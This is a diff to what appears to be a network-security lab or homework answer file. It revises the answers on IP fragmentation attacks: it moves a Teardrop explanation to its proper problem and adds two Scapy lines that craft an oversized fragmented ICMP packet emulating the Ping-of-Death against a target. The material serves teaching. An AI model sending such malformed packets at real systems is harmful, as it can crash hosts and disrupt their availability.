@@ -102,7 +102,11 @@ Please create two packets to emulate the Teardrop attack. Provide:
 - A brief explanation of how the overlap occurs
 
 **Answer**:
-Overlapping fragments: 
+A Teardrop attack exploits the IP reassembly process. 
+- The attacker sends malformed, overlapping IP fragments to a target.
+- The fragments have offsets that conflict when the target tries to reassemble them.
+
+Overlapping fragments example: 
 
 ```python 
 #!/usr/bin/python3  
@@ -148,9 +152,12 @@ Please create two packets to emulate the Ping-of-Death attack. Provide:
 - Python code
 - A brief explanation of how the overlap occurs
 
-**Answer**: A Teardrop attack exploits the IP reassembly process. 
-- The attacker sends malformed, overlapping IP fragments to a target.
-- The fragments have offsets that conflict when the target tries to reassemble them.
+**Answer**: A Ping-of-Death attack is a denial-of-service exploit where an attacker sends malformed, oversized fragmented ICMP packets that exceed the 65,535-byte IP limit, causing vulnerable systems to crash when reassembling them.
+
+```python
+send ( IP(dst=target, id=1111, flags="MF") / ICMP() / ("D" * 65528) )
+send ( IP(dst=target, id=1111, frag=8191) / ("D" * 100) )
+```
 
 ### Problem 6
 What is reverse path filtering? What is the purpose of such a mechanism?
